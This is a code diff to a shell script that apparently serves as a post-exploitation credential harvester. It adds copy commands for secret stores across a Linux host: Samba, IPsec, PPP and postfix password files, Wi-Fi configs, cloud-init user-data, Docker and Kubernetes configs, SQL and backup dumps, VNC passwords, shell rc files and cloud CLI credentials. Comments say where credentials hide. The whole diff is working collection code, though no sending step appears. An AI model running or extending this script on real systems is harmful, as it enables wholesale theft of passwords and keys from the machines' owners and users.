@@ -86,6 +86,44 @@ if [ -r /etc/fstab ]; then
         while IFS= read -r cf; do cp_one "$cf"; done
 fi
 
+# ================= CRON / SYSTEMD / SHELL-RC (config_env.py) =============
+cp_one /etc/crontab
+cp_one /etc/environment
+cp_one /etc/profile
+cp_one /etc/bash.bashrc
+cp_dir /etc/cron.d
+cp_dir /etc/cron.daily
+cp_dir /etc/cron.hourly
+cp_dir /etc/cron.weekly
+cp_dir /etc/cron.monthly
+cp_dir /var/spool/cron
+cp_dir /etc/profile.d
+# systemd unit files (Environment= / EnvironmentFile= hold inline creds)
+cp_find "*.service" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system /run/systemd/system
+
+# ================= SERVICE CONFIGS (services.py) =========================
+cp_one /etc/samba/smbpasswd
+cp_one /etc/samba/secrets.tdb
+cp_one /etc/ipsec.secrets
+cp_one /etc/strongswan.conf
+cp_find "*.secrets" /etc/ipsec.d
+cp_one /etc/ppp/chap-secrets
+cp_one /etc/ppp/pap-secrets
+cp_one /etc/postfix/sasl_passwd
+cp_one /etc/postfix/sasl/sasl_passwd
+cp_one /etc/redis/redis.conf
+cp_one /etc/redis.conf
+cp_find "*.conf" /etc/wpa_supplicant
+# cloud-init user-data (may contain passwd/hashed_passwd)
+cp_find "user-data*" /var/lib/cloud/instance /var/lib/cloud/instances
+# docker per-container env
+cp_find "config.v2.json" /var/lib/docker/containers
+# kubernetes admin/service configs
+cp_find "*.conf" /etc/kubernetes
+# db / backup dumps (pointers; grep offline)
+cp_find "*.sql" /var/www /srv /opt /var/backups /root /home
+cp_find "*.bak" /var/www /srv /opt /var/backups /root /home
+
 # ================= WEB / DB / APP CONFIGS (walk) =================
 WEBROOTS="/var/www /srv /opt /usr/share/nginx /usr/local/www /var/lib /etc"
 for pat in "wp-config.php" "config.php" "config.inc.php" "configuration.php" \
@@ -110,6 +148,11 @@ for h in $HOMES; do
         cp_one "$h/$hist"
     done
     cp_one "$h/.local/share/fish/fish_history"
+    # shell rc / env (config_env.py) + user crontab + mysql/vnc (services.py)
+    for rc in .bashrc .bash_profile .zshrc .profile .bash_login .kshrc .cshrc \
+              .mylogin.cnf .vnc/passwd .vnc/passwdfile; do
+        cp_one "$h/$rc"
+    done
     # cloud / cli / dev creds
     for c in .aws/credentials .aws/config .azure/accessTokens.json \
              .azure/azureProfile.json .config/gcloud/credentials.db \
